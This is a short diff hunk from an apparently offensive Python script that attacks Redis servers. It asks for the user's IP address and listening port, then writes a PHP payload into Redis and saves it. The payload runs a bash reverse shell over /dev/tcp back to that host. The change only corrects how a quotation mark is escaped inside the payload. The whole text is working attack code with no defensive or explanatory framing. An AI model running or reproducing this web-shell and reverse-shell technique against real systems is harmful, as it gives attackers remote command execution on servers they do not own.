@@ -45,7 +45,7 @@ def initiate_shell(ip):
         user_ip = input("Enter your IP address for the reverse shell: ")
         user_port = input("Enter the port you will listen on: ")
         shell_command = f'''
-set test "<?php exec(\\"/bin/bash -c 'bash -i > /dev/tcp/{user_ip}/{user_port} 0>&1'\"); ?>"
+set test "<?php exec(\\"/bin/bash -c 'bash -i > /dev/tcp/{user_ip}/{user_port} 0>&1'\\"); ?>"
 '''
         run_redis_command(ip, shell_command)
         run_redis_command(ip, 'save')
